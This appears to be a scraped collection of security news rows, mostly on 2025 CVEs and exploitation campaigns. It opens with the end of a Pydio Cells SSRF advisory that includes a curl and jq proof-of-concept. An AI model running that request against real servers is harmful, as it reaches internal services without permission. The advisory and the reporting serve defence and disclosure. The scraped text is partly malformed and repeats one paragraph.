file, which are uploaded to the specified folder within Pydio Cells. Potential errors are transmitted in a WebSocket channel, which can be opened through the ""/ws/event"" endpoint. Proof of Concept Log into Pydio Cells and retrieve the JWT from the HTTP requests. Then, run the following commands to start a ""remote-download"" job to trigger an HTTP request: $ export JWT="" "" $ echo '{""urls"": ["" <URL> ""target"": ""personal-files""}' \ | jq '{""JobName"": ""remote-download"", ""JsonParameters"": }' \ | tee remote-download.json $ curl --header ""Authorization: Bearer $JWT"" \ --header 'Content-Type: application/json' \ --request PUT \ --data -download.json ' <URL> The URL in the JSON document specifies which URL to request. The ""target"" field in the same document specifies into which folder the response is saved. Afterwards, the response is contained in a file in the specified folder. Potential errors are communicated through the WebSocket channel. Workaround Limit the services which can be reached by the Pydio Cells server, for example using an outbound firewall. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk The risk is highly dependent on the environment in which the attacked Pydio Cells instance runs. If there are any internal HTTP services which expose sensitive data on the same machine or within the same network, the server-side request forgery vulnerability could pose a significant risk. In other circumstances, the risk could be negligible. Therefore, overall the vulnerability is rated as a medium risk.

On Tuesday, SonicWall updated security advisories for theCVE-2023-44221andCVE-2024-38475security flaws to tag the two vulnerabilities as ""potentially being exploited in the wild."" CVE-2023-44221 is described as a high-severity command injection vulnerability caused by improper neutralization of special elements in the SMA100 SSL-VPN management interface that enables attackers with admin privileges to inject arbitrary commands as a 'nobody' user. The second security bug, CVE-2024-38475, is rated as a critical severity flaw caused by improper escaping of output in modrewrite in Apache HTTP Server 2.4.59 and earlier. Successful exploitation can allow unauthenticated, remote attackers to gain code execution by mapping URLs to file system locations permitted to be served by the server. The two vulnerabilities impact SMA 200, SMA 210, SMA 400, SMA 410, and SMA 500v devices and are patched in firmware version 10.2.1.14-75sv and later. ""During further analysis, SonicWall and trusted security partners identified an additional exploitation technique using CVE-2024-38475, through which unauthorized access to certain files could enable session hijacking,""SonicWall warnedin an updated advisory.

As the companyfirst revealed on March 7, 2025, Commvault discovered the incident after being notified by Microsoft on February 20 of suspicious activity within its Azure environment. A follow-up investigation into the breach found that the incident only affected a small number of Commvault customers and had not impacted the company's operations. ""Importantly, there has been no unauthorized access to customer backup data that Commvault stores and protects, and no material impact on our business operations or our ability to deliver products and services,"" Danielle Sheer, the company's Chief Trust Officer,said in a Wednesday update. ""We are working closely with two leading cybersecurity firms and are coordinating with the appropriate authorities, including the FBI, Cybersecurity and Infrastructure Security Agency , and others."" In asupport documentcontaining indicators of compromise, Commvault advises customers to apply a Conditional Access policy to all Microsoft 365, Dynamics 365, and Azure AD single-tenant App registrations to protect their data against similar attack attempts. It also recommended to regularly monitor sign-in activity to detect access attempts originating from IP addresses outside of allowed ranges and to rotate and sync client secrets between Commvault and the Azure portal every 90 days. ""This can help quickly identify potential security breaches or account compromises. If any unauthorized access is detected, immediately report the incident to Commvault Support for further investigation and remediation,"" the company says. The company also noted in the original disclosure that the threat actors exploited a now-patched zero-day vulnerability in its Commvault Web Server software that remote authenticated attackers with low privileges can exploit remotely to plant webshells on target servers.

CVE-2025-31324,2025-04-28,bleepingcomputer,"Over 1,200 internet-exposed SAP NetWeaver instances are vulnerable to an actively exploited maximum severity unauthenticated file upload vulnerability that allows attackers to hijack servers. SAP NetWeaver is an application server and development platform that runs and connects SAP and non-SAP applications across different technologies. Last week, SAP disclosed an unauthenticated file upload vulnerability, tracked as CVE-2025-31324, in SAP NetWeaver Visual Composer, specifically the Metadata Uploader component. The flaw allows remote attackers to upload arbitrary executable files on exposed instances without authenticating, achieving code execution and full system compromise. Multiple cybersecurity firms, including ReliaQuest, watchTowr, and Onapsis, confirmed the flaw isactively exploited in attacks, with threat actors utilizing it to drop web shells on vulnerable servers. A SAP spokesperson told BleepingComputer that they were aware of these attempts and released a workaround on April 8, 2024, followed by a security update that addressed CVE-2025-31324 on April 25. SAP told BleepingComputer that they are not aware of any cases where these attacks impacted customer data or systems. Researchers have now confirmed that many vulnerable SAP Netweaver servers are exposed on the internet, making them prime targets for attacks. TheShadowserver Foundationfound the427 exposed servers, warning of the massive exposed attack surface and the potentially severe repercussions of exploitation. Most of the vulnerable systems are in the United States, followed by India , Australia , China , Germany , the Netherlands , Brazil , and France . However, cyber defense search engineOnyphepaints a more dire picture, telling BleepingComputer that there are 1,284 vulnerable servers exposed online, with 474 already having been compromised with webshells. ""Something like 20 Fortune 500/Global 500 companies are vulnerable, and many of them are compromised,"" Onyphe CTO Patrice Auffret told BleepingComputer. Researchers reported that the threat actors are utilizing webshells with names like, ""cache.jsp"" and ""helper.jsp."" Howver,Nextron Research saysthey are also using random names, making it more difficult to find vulnerable Netweaver instances. While the number of servers is not massive, the risk is still significant, given that large enterprises and multinational corporations commonly use SAP NetWeaver.

CVE-2025-32432,2025-04-25,bleepingcomputer,"Two vulnerabilities impacting Craft CMS were chained together in zero-day attacks to breach servers and steal data, with exploitation ongoing, according to CERT Orange Cyberdefense. The vulnerabilities were discovered by Orange Cyberdefense's CSIRT, which was called in to investigate a compromised server. As part of the investigation, they discovered that two zero-day vulnerabilities impacting Craft CMS were exploited to breach the server: According to a report by SensePost, the ethical hacking team of Orange Cyberdefense, the threat actors chained both of these vulnerabilities together to breach servers and upload a PHP file manager. The attack begins with the exploitation of CVE-2025-32432, which allows attackers to send a specially crafted request containing a ""return URL"" as a parameter that is saved in a PHP session file. This session name is sent to the visitor as part of the response to the HTTP request. The second stage of the attack leveraged a flaw in the Yii framework , which Craft CMS utilizes.

CVE-2025-21204,2025-04-25,bleepingcomputer,"A recent Windows security update that creates an ‘inetpub’ folder has introduced a new weakness allowing attackers to prevent the installation of future updates. After people installed this month'sMicrosoft Patch Tuesdaysecurity updates, Windows userssuddenly found an ""inetpub"" folderowned by the SYSTEM account created in the root of the system drive, normally the C: drive. It was strange to see this folder created as it is normally used to hold files associated with Microsoft's Internet Information Service web server, which was not installed on these devices. In an update to asecurity advisory, Microsoft later confirmed that the C:\inetpub folder was part of a fix for a Windows Process Activation elevation of privilege vulnerability tracked as CVE-2025-21204, with the companywarning not to delete the folder. ""After installing the updates listed in the Security Updates table for your operating system, a new %systemdrive%\inetpub folder will be created on your device,""confirmed Microsoft. ""This folder should not be deleted regardless of whether Internet Information Services is active on the target device. This behavior is part of changes that increase protection and does not require any action from IT admins and end users."" However, cybersecurity expert Kevin Beaumont has demonstrated that this folder can be abused to prevent further Windows updates from being installed if it is created a certain way. ""I've discovered this fix introduces a denial of service vulnerability in the Windows servicing stack that allows non-admin users to stop all future Windows security updates,"" Kevin Beaumont. In a new report,Beaumont saysthat Windows users, even those without administrative privileges, can create a junction between C:\inetpub and a Windows file, like C:\windows\system32\notepad.exe using the following command. A Windows junction is a special type of folder that redirects access to another folder on the same or another drive, making it appear as though the content exists in both locations. When asked why this junction is preventing the update from being installed, Beaumont says he believes it's because the update expects a folder rather than a file. ""It works with basically any file, I think it's because the servicing stack expects c:\inetpub to be a directory - but mklink allows you to make a junction to a file,"" Beaumont told BleepingComputer. According toMicrosoft's documentation, junctions are meant to be links between folders rather than between files. However, as you can see from the image earlier in the article, it is still possible to create one as shown in the image below. With this junction created, if you attempt to install the April security update, it will not install correctly, giving a0x800F081F error code. This code is related to the error ""CBSESOURCEMISSING,"" which means a package or file was not found. Beaumont says he reported the bug to Microsoft, who has assigned it a ""Medium"" severity classification and closed his case, stating they will consider fixing it in the future. ""After careful investigation, this case is currently rated as a Moderate severity issue,""Microsoft emailed Beaumont. ""It does not meet MSRCs current bar for immediate servicing as the update fails to apply only if the 'inetpub' folder is a junction to a file and succeeds upon deleting the inetpub symlink and retrying."" BleepingComputer also contacted Microsoft about this bug on Wednesday but has not received a response yet. Based on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.

CVE-2025-32433,2025-04-19,bleepingcomputer,"Public exploits are now available for a critical Erlang/OTP SSH vulnerability tracked as CVE-2025-32433, allowing unauthenticated attackers to remotely execute code on impacted devices. Researchers at the Ruhr University Bochum in Germany disclosed the flaw on Wednesday, warning that all devices running the daemon were vulnerable. ""The issue is caused by a flaw in the SSH protocol message handling which allows an attacker to send connection protocol messages prior to authentication,"" readsa disclosureon the OpenWall vulnerability mailing list. The flaw was fixed in versions 25.3.2.10 and 26.2.4, but as the paltform is commonly used in telecom infrastructure, databases, and high-availability systems, it may not be easy to update devices immediately. However, the situation has become more urgent, as multiple cybersecurity researchers have privately created exploits that achieve remote code execution on vulnerable devices. This includesPeter Girnusof the Zero Day Initiative and researchers from Horizon3, who said the flaw wassurprisingly easy to exploit. Soon after, PoC exploits werepublished on GitHubby ProDefense, and another was published anonymously on Pastebin, with both quickly shared on social media. Girnus confirmed to BleepingComputer that ProDefense's PoC is valid but was not able to successfully exploit Erlang/OTP SSH using the one posted to Pastebin. Now that public exploits are available, threat actors will soon begin scanning for vulnerable systems and exploiting them. ""SSH is the most commonly used remote access management protocol so I expect this combination to be widespread in critical infrastructure,"" Girnus told BleepingComputer. ""It's a bit concerning especially considering how frequently telcos are targeted by nation state APTs such as Volt and Salt Typhoon for example."" Girnus refers to the Chinese state-sponsored hacking groups responsible forhacking edge networking equipmentandbreaching telecommunications providersin the US and worldwide. According toShodan queryshared by Girnus, there are over 600,000 IP addresses running Erlang/OTP. However, the researcher says the majority of these devices are running CouchDB, which is not impacted by the vulnerability. An Apache CouchDB representative also confirmed to BleepingComputer that CouchDB does not use the SSH server or client features from Erlang/OTP, so is not vulnerable. Now that public exploits are available, it is strongly advised that all devices running Erlang OTP SSH be upgraded immediately before threat actors compromise them.

CVE-2021-20035,2025-04-18,bleepingcomputer,"A remote code execution vulnerability affecting SonicWall Secure Mobile Access appliances has been under active exploitation since at least January 2025, according to cybersecurity company Arctic Wolf. This security flaw impacts SMA 200, SMA 210, SMA 400, SMA 410, and SMA 500v devices and was patched almost four years ago, in September 2021, when SonicWall said it could only be exploited to take down vulnerable appliances in denial-of-service attacks. However, the company updated the four-year-old security advisory on Monday toflag the security bug as exploited in attacks, expand the impact to include remote code execution, and upgrade the CVSS severity score from medium to high severity. ""This vulnerability is believed to be actively exploited in the wild. As a precautionary measure, SonicWall PSIRT has updated the summary and revised the CVSS score to 7.2,"" SonicWall said. Successful exploitation can allow remote threat actors with low privileges to exploit an ""improper neutralization of special elements in the SMA100 management interface"" to inject arbitrary commands as a 'nobody' user and execute arbitrary code in low-complexity attacks. CISA has also added the vulnerability to itsKnown Exploited Vulnerabilities catalog, confirmingit's now being abused in the wildand ordering Federal Civilian Executive Branch agencies to secure their networks against ongoing attacks until May 7th. Days after SonicWall tagged the security bug as exploited in the wild without sharing when the attacks started, cybersecurity company Arctic Wolf reported that threat actors used CVE-2021-20035 exploits in attacks as early as January 2025. In this campaign, the attackers have also used a local super admin account with a ""password"" default password to target SMA 100 appliances with the management interface exposed online. ""Arctic Wolf has identified an ongoing VPN credential access campaign targeting SMA 100 series appliances, with a starting timeframe as early as January 2025, extending into April 2025,""the cybersecurity firm said. ""One noteworthy aspect of the campaign was the use of a local super admin account on these appliances, which has an insecure default password of password."" To block CVE-2021-20035 attacks targeting their SonicWall appliances, Arctic Wolf advised network defenders to limit VPN access to the minimum necessary accounts, deactivate unneeded accounts, enable multi-factor authentication for all accounts, and reset passwords for all local accounts on SonicWall SMA firewalls. In February, SonicWall also urged customers in January to patch acritical vulnerability affecting SMA1000 secure access gatewaysfollowing reports that it had already been exploited in zero-day attacks and, one month later, warned of anactively exploited authentication bypass flawin Gen 6 and Gen 7 firewalls that can let hackershijack VPN sessions.

CVE-2025-32433,2025-04-17,bleepingcomputer,"A critical vulnerability in the Erlang/OTP SSH, tracked as CVE-2025-32433, has been disclosed that allows for unauthenticated remote code execution on vulnerable devices. The flaw was discovered by Fabian Bäumer, Marcus Brinkmann, Marcel Maehren, and Jörg Schwenk of the Ruhr University Bochum in Germany and given a maximum severity score of 10.0. All devices running the Erlang/OTP SSH daemon are impacted by the vulnerability and are advised to upgrade to versions 25.3.2.10 and 26.2.4 to fix the flaw. Erlang is a programming language known for its fault-tolerance and concurrency, making it commonly used in telecom infrastructure and high -availability systems. Erlang/OTP is a set of libraries, design principles, and tools built on top of Erlang that provides components like the SSH application for remote access. The CVE-2025-32433 vulnerability is caused by the improper handling of certain pre-authentication protocol messages within the SSH daemon provided by Erlang/OTP's SSH application. ""The issue is caused by a flaw in the SSH protocol message handling which allows an attacker to send connection protocol messages prior to authentication,"" readsa disclosureon the OpenWall vulnerability mailing list. Any commands executed through the vulnerability will be run with the same privileges as the SSH daemon. In many cases, the daemon runs as root, which would allow attackers to fully compromise the system. Horizon3's Attack Team, known for their exploit research, warned on X that they had reproduced the flaw and found it ""surprisingly easy,"" demonstrating a PoC that writes a file as root on affected systems. ""Just finished reproducing CVE-2025-32433 and putting together a quick PoC exploit — surprisingly easy. Wouldn't be shocked if public PoCs start dropping soon. If you're tracking this, now's the time to take action,""Horizon3 posted to X. Organizations are strongly advised to upgrade to the fixed versions immediately before a PoC becomes public and the flaw is mass-exploited. For systems, such as industrial or mission-critical devices that can't be easily updated, it is advised that access to SSH be restricted to trusted IPs, or the SSH daemon should be turned off if not needed.

CVE-2025-24054,2025-04-17,bleepingcomputer,"A Windows vulnerability that exposes NTLM hashes using .library-ms files is now actively exploited by hackers in phishing campaigns targeting government entities and private companies. The flaw tracked asCVE-2025-24054was fixed in Microsoft'sMarch 2025 Patch Tuesday. Initially, it was not marked as actively exploited and was assessed as 'less likely' to be. However, Check Point researchers report having observed active exploitation activity for CVE-2025-24054 only a few days after patches became available, culminating between March 20 and 25, 2025. Although one IP address behind these attacks was previously linked to the Russia state-sponsored threat group APT28 , it is not enough evidence for confident attribution. NTLM is a Microsoft authentication protocol that uses challenge-response negotiation involving hashes instead of transmitting plaintext passwords to authenticate users. While NTLM avoids transmitting plaintext passwords, it is no longer considered secure due to vulnerabilities likereplay attacksandbrute-force cracking of captured hashes. Due to this, Microsoft hasbegun phasing out NTLM authenticationin favor of Kerberos or Negotiate. In attacks seen by Check Point, phishing emails were sent to entities in Poland and Romania that included a Dropbox link to a ZIP archive, containing a .library-ms file. A library-ms file is a legitimate file type that, when opened, shows aWindows library, or virtual container, that contains files and folders from different configured sources. In this phishing attack, the library-ms file was created to contain a path to a remote SMB server under the attacker's control. When extracting a ZIP file that contains a .library-ms file, Windows Explorer will interact with it automatically, triggering the CVE-2025-24054 flaw and causing Windows to make an SMB connection to the URL specified in the file. When Windows connects to the remote SMB server, it will attempt to authenticate via NTLM, allowing the attacker to capture the user's NTLM hashes. In a later campaign, Check Point discovered phishing emails that contained .library-ms attachments, without an archive. Simply downloading the .library-ms file was enough to trigger NTLM authentication to the remote server, demonstrating that archives were not required to exploit the flaw. ""On March 25, 2025, Check Point Research discovered a campaign targeting companies around the world, distributing these files without being zipped,""explains Check Point. ""According to Microsoft, this exploit is triggered with minimal user interaction with a malicious file, such as selecting , inspecting , or performing any action other than opening or executing the file."" The malicious archive also contains three more files, namely 'xd.url,' 'xd.website,' and 'xd.link,' which leverage older NTLM hash leak flaws and are most likely included for redundancy in case the 'library-ms' method fails. Check Point says the attacker-controlled SMB servers in this campaign were using the 159.196.128120 and 194.127.179157 IP addresses. Capturing NTLM hashes could open the way to authentication bypass and privilege escalation, so even though CVE-2025-24054 is only evaluated as a ""medium"" severity issue, its potential consequences are grave. Given the low interaction required to exploit, organizations should treat this as a high-risk issue. It is advised that all organizations should install the March 2025 updates and turn off NTLM authentication if it is not required.

Statisticsshowthat the product is active on 100,000 websites. Yesterday,Wordfence disclosedan authentication bypass vulnerability in OttoKit, identified as CVE-2025-3102. The flaw impacts all versions of SureTriggers/OttoKit up to 1.0.78. The flaw stems from a missing empty value check in theauthenticateuserfunction, which handles REST API authentication. Exploitation to be possible if the plugin is not configured with an API key, which causes the storedsecretkeyto remain empty. An attacker could exploit this by sending an emptystauthorizationheader to pass the check and grant unauthorized access to protected API endpoints. Essentially, CVE-2025-3102 allows attackers to create new administrator accounts without authentication, posing a high risk of full site takeover. Wordfence received a report about the flaw from security researcher 'mikemyers', who earned a bounty of $1,024 for the discovery in mid-March. The plugin vendor was contacted on April 3 with the full exploitation details, and they released a fix via version 1.0.79 on the same day. However, hackers quickly jumped at the opportunity to exploit the issue, taking advantage of administrators' delay in updating the plugin to address the security problem. Researchers at WordPress security platform Patchstack are warning that the first exploitation attempts in the wild were logged only a few hours after the disclosure of the flaw. “Attackers were quick to exploit this vulnerability, with the first recorded attempt occurring just four hours after it was added as a vPatch to our database,”reports Patchstack. “This swift exploitation highlights the critical need to apply patches or mitigations immediately upon the public disclosure of such vulnerabilities,” the researchers say. The threat actors attempt to create new administrator accounts using randomized username/password and email address combination, a sign of task automation.

The vulnerability, tracked asCVE-2025-29824, was patched duringthis month's Patch Tuesdayand was only exploited in a limited number of attacks. CVE-2025-29824 is due to a use-after-free weakness that lets local attackers with low privileges gain SYSTEM privileges in low-complexity attacks that don't require user interaction. While the company has issued security updates for impacted Windows versions, it delayed releasing patches for systems running Windows 10 LTSB 2015 and said they would be released as soon as possible.

The vulnerability, tracked asCVE-2025-29824, was patched duringthis month's Patch Tuesdayand was only exploited in a limited number of attacks. CVE-2025-29824 is due to a use-after-free weakness that lets local attackers with low privileges gain SYSTEM privileges in low-complexity attacks that don't require user interaction. While the company has issued security updates for impacted Windows versions, it delayed releasing patches for systems running Windows 10 LTSB 2015 and said they would be released as soon as possible. ""The targets include organizations in the information technology and real estate sectors of the United States, the financial sector in Venezuela, a Spanish software company, and the retail sector in Saudi Arabia,""Microsoft revealed today. ""Customers running Windows 11, version 24H2 are not affected by the observed exploitation, even if the vulnerability was present. Microsoft urges customers to apply these updates as soon as possible."" Microsoft linked these attacks to the RansomEXX ransomware gang, which it tracks as Storm-2460. The attackers first installed the PipeMagic backdoor malware on compromised systems, which was used to deploy the CVE-2025-29824 exploit, ransomware payloads, and !READMEREXX2!.txt ransom notes after encrypting files. ​As ESET reported last month, PipeMagic has also been used to deploy exploitstargeting a Windows Win32 Kernel Subsystem zero-day since March 2023. Discovered by Kaspersky in 2022, the malware can harvest sensitive data, provides full remote access to infected devices, and enables attackers to deploy additional malicious payloads to move laterally through victims' networks.

CVE-2025-30401,2025-04-08,bleepingcomputer,"Meta warned Windows users to update the WhatsApp messaging app to the latest version to patch a vulnerability that can let attackers execute malicious code on their devices. Described as a spoofing issue and tracked asCVE-2025-30401, this security flaw can be exploited by attackers by sending maliciously crafted files with altered file types to potential targets. Metasaysthe vulnerability impacted all WhatsApp versions and has been fixed with the release of WhatsApp 2.2450.6. ""A spoofing issue in WhatsApp for Windows prior to version 2.2450.6 displayed attachments according to their MIME type but selected the file opening handler based on the attachment's filename extension,"" WhatsAppexplained in a Tuesday advisory. ""A maliciously crafted mismatch could have caused the recipient to inadvertently execute arbitrary code rather than view the attachment when manually opening the attachment inside WhatsApp."" Meta says an external researcher found and reported the flaw via a Meta Bug Bounty submission. The company has yet to share if CVE-2025-30401 was exploited in the wild. In July 2024,WhatsApp addressed a slightly similar issuethat allowed Python and PHP attachments to be executed without warning when recipients opened them on Windows devices with Python installed. More recently, following reports from security researchers at the University of Toronto's Citizen Lab, WhatsApp alsopatched a zero-click, zero-day security vulnerabilitythat was exploited to install Paragon's Graphite spyware. The company said the attack vector was addressed late last year ""without the need for a client-side fix"" and decided against assigning a CVE-ID after ""reviewing the CVE guidelines published by MITRE, and own internal policies."" On January 31, after mitigating the security issue server-side, WhatsAppalerted roughly 90 Android usersfrom over two dozen countries, includingItalian journalistsand activists who were targeted in Paragon spyware attacks using the zero-click exploit. Last December, a U.S. federal judge also ruled that Israeli spyware maker NSO Group used WhatsApp zero-days to deploy Pegasus spyware on at least 1,400 devices, thus violating U.S. hacking laws. Court documentsrevealed that NSO allegedly deployed Pegasus spyware in zero-click attacks that exploited WhatsApp vulnerabilities using multiple zero-day exploits. The documents also said that the spyware maker's developers reverse-engineered WhatsApp's code to create tools that sent malicious messages that installed spyware, violating federal and state laws.

CVE-2025-24071,2025-04-07,bleepingcomputer,"EncryptHub, a notorious threat actor linked to breaches at 618 organizations, is believed to have reported two Windows zero-day vulnerabilities to Microsoft, revealing a conflicted figure straddling the line between cybercrime and security research. The reported vulnerabilities areCVE-2025-24061 andCVE-2025-24071, which Microsoft addressed during theMarch 2025 Patch Tuesdayupdates, acknowledging the reporter as 'SkorikARI with SkorikARI .' Anew report by Outpost24researchers has now linked the EncryptHub threat actor with SkorikARI after the threat actor allegedly infected himself and exposed their credentials. This exposure allowed the researchers to link the threat actor to various online accounts and expose the profile of a person who vacillates between being a cybersecurity researcher and a cybercriminal. One of the exposed accounts is SkorikARI, which the hacker used to disclose the two mentioned zero-day vulnerabilities to Microsoft, contributing to Windows security. Hector Garcia, Security Analyst at Outpost24, told BleepingComputer that the link of SkorikARI to EncryptHub is based on multiple pieces of evidence, making up for a high-confidence assessment. ""The hardest evidence was from the fact that the password files EncrypHub exfiltrated from his own system had accounts linked to both EncryptHub, like credentials to EncryptRAT, which was still in development, or his account on xss.is, and to SkorikARI, like accesses to freelance sites or his own Gmail account,"" explained Garcia. ""There was also a login to hxxps:// githubcom/SkorikJR, which was mentioned in July's Fortinet Article about Fickle Stealer, bringing it all together."" ""Another huge confirmation of the link between the two were the conversations with ChatGPT, where activity related both to EncryptHub and to SkorikARI can be observed."" EncryptHub's foray into zero-days is not new, with the threat actor or one of the members attempting to sell zero-days to other cybercriminals on hacking forums. Outpost24 delved into EncryptHub's journey, stating that the hacker repeatedly shifts between freelance development work and cybercrime activity. Despite his apparent IT expertise, the hacker reportedly fell victim to bad opsec practices that allowed his personal information to be exposed. This includes the hacker's use of ChatGPT for developing malware and phishing sites, integrating third-party code, and researching vulnerabilities. The threat actor also had a deeper, personal engagement with OpenAI's LLM chatbot, in one case describing his accomplishments and asking the AI to categorize him as a cool hacker or malicious researcher. Based on the provided inputs, ChatGPT assessed him as 40% black hat, 30% grey hat, 20% white hat, and 10% uncertain, reflecting a morally and practically conflicted individual. The same conflict is reflected in his future planning on ChatGPT, where the hacker asks for the chatbot's help in organizing a massive but ""harmless"" campaign impacting tens of thousands of computers for publicity. EncryptHub is a threat actor that is believed to be loosely affiliated with ransomware gangs, such as RansomHub and the BlackSuit operations. However, more recently, the threat actors have made a name for themselves with various social engineering campaigns, phishing attacks, and creating a custom PowerShell-based infostealer namedFickle Stealer. The threat actor is also known for conducting social engineering campaigns where they create social media profiles and websites for fictitious applications. In one example,researchers foundthat the threat actor created an X account and website for a project management application called GartoriSpace. This site was promoted through private messages on social media platforms that would provide a code required to download the software.

CVE-2025-31334,2025-04-05,bleepingcomputer,"A vulnerability in the WinRAR file archiver solution could be exploited to bypass the Mark of the Web security warning and execute arbitrary code on a Windows machine. The security issue is tracked as CVE-2025-31334 and affects all WinRAR versions except the most recent release, which is currently 7.11. Mark of the Web is a security function in Windows in the form of a metadata value to tag as potentially unsafe files downloaded from the internet. When opening an executable with the MotW tag, Windows warns the user that it was downloaded from the internet and could be harmful and offers the option to continue execution or terminate it. The CVE-2025-31334 vulnerability can help a threat actor bypass the MotW security warning when opening a symbolic link pointing to an executable file in any WinRAR version before 7.11. An attacker could execute arbitrary code by using a specially crafted symbolic link. It should be noted that a symlink can be created on Windows only with administrator permissions. The security issue received amedium severity score of 6.8 and has been fixed in the latest version of WinRAR, as noted in the applications change log: “If symlink pointing at an executable was started from WinRAR shell, the executable Mark of the Web data was ignored” -WinRAR The vulnerability was reported by Shimamine Taihei of Mitsui Bussan Secure Directions through the Information Technology Promotion Agency in Japan. Japan’s Computer Security Incident Response Teamcoordinatedthe responsible disclosure with WinRAR’s developer. Starting version 7.10, WinRAR provides the possibility to remove from the MotW alternate data stream information that could be considered a privacy risk. Threat actors, including state-sponsored ones, have exploited MotW bypasses in the past to deliver various malware without triggering the security warning. Recently, Russian hackers leveraged such a vulnerability in the 7-Zip archiver, which did not propagate the MotW whendouble archiving to run the Smokeloader malware dropper.

CVE-2025-30065,2025-04-03,bleepingcomputer,"A maximum severity remote code execution vulnerability has been discovered impacting all versions of Apache Parquet up to and including 1.15.0. The problem stems from the deserialization of untrusted data that could allow attackers with specially crafted Parquet files to gain control of target systems, exfiltrate or modify data, disrupt services, or introduce dangerous payloads such as ransomware. The vulnerability is tracked underCVE-2025-30065and has a CVSS v4 score of 10.0. The flaw was fixed with the release of Apache version 1.15.1. It should be noted that to exploit this flaw, threat actors must convince someone to import a specially crafted Parquet file. Apache Parquet is an open-source, columnar storage format designed for efficient data processing. Unlike row-based formats , Parquet stores data by columns, which makes it faster and more space-efficient for analytical workloads. It is widely adopted across the data engineering and analytics ecosystem, including big data platforms like Hadoop, AWS, Amazon, Google, and Azure cloud services, data lakes, and ETL tools. Some large companies that use Parquet include Netflix, Uber, Airbnb, and LinkedIn. The security problem in Parquet was disclosed on April 1, 2025, following a responsible disclosure by its finder, Amazon researcher Keyi Li. ""Schema parsing in the parquet-avro module of Apache Parquet 1.15.0 and previous versions allows bad actors to execute arbitrary code,"" warned the shortbulletin published on Openwall. ""Users are recommended to upgrade to version 1.15.1, which fixes the issue."" A separate bulletin by Endor Labs highlights the risk of CVE-2025-30065 exploitation more clearly, warning that the flaw can impact any data pipelines and analytics systems that import Parquet files, with the risk being significant for files sourced from external points. Endor Labs believes the problem was introduced in Parquet version 1.8.0, though older releases might also be impacted. The firm suggests coordinated checks with developers and vendors to determine what Praquet versions are used in production software stacks. ""If an attacker tricks a vulnerable system into reading a specially crafted Parquet file, they could gain remote code execution on that system,""warns Endor Labs. However, the security firm avoids over-inflating the risk by including the note, ""Despite the frightening potential, it's important to note that the vulnerability can only be exploited if a malicious Parquet file is imported."" That being said, if upgrading to Apache Parquet 1.15.1 immediately is impossible, it is suggested to avoid untrusted Parquet files or carefully validate their safety before processing them. Also, monitoring and logging on systems that handle Parquet processing should be increased. Although no active exploitation has been discovered yet, the risk is high due to the flaw's severity and the widespread use of Parquet files in big data applications. Administrators of impacted systems are recommended to upgrade to Parquet version 1.15.1, which addresses CVE-2025-30065, as soon as possible.

""We assess it is likely the threat actor studied the patch for the vulnerability in ICS 22.7R2.6 and uncovered through a complicated process, it was possible to exploit 22.7R2.5 and earlier to achieve remote code execution."" UNC5221 is known for targeting zero-day vulnerabilities in network edge devices since 2023, including various Ivanti and NetScaler appliances. Most recently, the Chinese hackersexploited CVE-2025-0282, another Ivanti Connect Secure buffer overflow, to drop new Dryhook and Phasejam malware on compromised VPN appliances. One year ago, the hacking group alsochained two Connect Secure and Policy Secure zero-days to remotely execute arbitrary commands on targeted ICS VPN and IPS network access control appliances. One of their victims wasthe MITRE Corporation, whichdisclosed the breach in April 2024. ​Threat intelligence company Volexity said in January 2024 that UNC5221 hadbackdoored over 2,100 Ivanti appliancesusing the GIFTEDVISITOR webshell in attacks chaining the two zero days. As CISA and the FBI warned in January 2025, attackers are still breaching vulnerable networks using exploits targetingIvanti Cloud Service Appliances security vulnerabilitiespatched since September. Multiple other Ivanti security flawshave beenexploitedas zero-daysover the last year against the company'sVPN appliancesandICS, IPS, and ZTA gateways. Update April 03, 14:16 EDT:Ivanti CSO Daniel Spicer sent the following statement after the story was published. Network security devices and edge devices in particular are a focus of sophisticated and highly persistent threat actors, and Ivanti is committed to providing information to defenders to ensure they can take every possible step to secure their environments. To this end, in addition to providing an advisory directly to customers, Ivanti worked closely with its partner Mandiant to provide additional information regarding this recently addressed vulnerability. Importantly, this vulnerability was fixed in ICS 22.7R2.6, released February 11, 2025, and customers running supported versions on their appliances and in accordance with the guidance provided by Ivanti have a significantly reduced risk. Ivanti’s Integrity Checker Tool has been successful in detecting potential compromise on a limited number of customers running ICS 9.X and 22.7R2.5 and earlier versions. Based on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.

CVE-2024-20440,2025-04-02,bleepingcomputer,"Cisco has warned admins to patch a critical Cisco Smart Licensing Utility vulnerability, which exposes a built-in backdoor admin account now used in attacks. CSLU is a Windows app for managing licenses and linked products on-premises without connecting them to Cisco's cloud-based Smart Software Manager solution. Ciscopatched this security flaw in September, describing it as ""an undocumented static user credential for an administrative account"" that lets unauthenticated attackers log into unpatched systems remotely with admin privileges over the Cisco Smart Licensing Utility app's API. CVE-2024-20439 only impacts systems running vulnerable Cisco Smart Licensing Utility releases, but it's only exploitable if the user starts the CSLU app . Aruba threat researcher Nicholas Starke reverse-engineered the vulnerability two weeks after Cisco released security patches andpublished a write-upwith technical details . ""In March 2025, the Cisco Product Security Incident Response Team became aware of attempted exploitation of this vulnerability in the wild,"" the companysaid in a Tuesday updateto the original security advisory. ""Cisco continues to strongly recommend that customers upgrade to a fixed software release to remediate this vulnerability."" While Cisco didn't share any details on these attacks, Johannes Ullrich, SANS Technology Institute's Dean of Research, spotted a campaign last month that used the backdoor admin account to attack CSLU instances exposed online. Ullrichsaid in Marchthat threat actors are chaining CVE-2024-20439 with a second flaw, a critical CLSU information disclosure vulnerability that unauthenticated attackers can exploit to gain access to log files containing sensitive data by sending crafted HTTP requests to vulnerable devices. ""A quick search didn't show any active exploitation , but details, including the backdoor credentials, were published in a blog by Nicholas Starke shortly after Cisco released its advisory. So it is no surprise that we are seeing some exploit activity,"" Ullrich said. On Monday, CISA added the CVE-2024-20439 static credential vulnerability to itsKnown Exploited Vulnerabilities Catalog, ordering U.S. federal agencies to secure their systems against active exploitation within three weeks, by April 21.
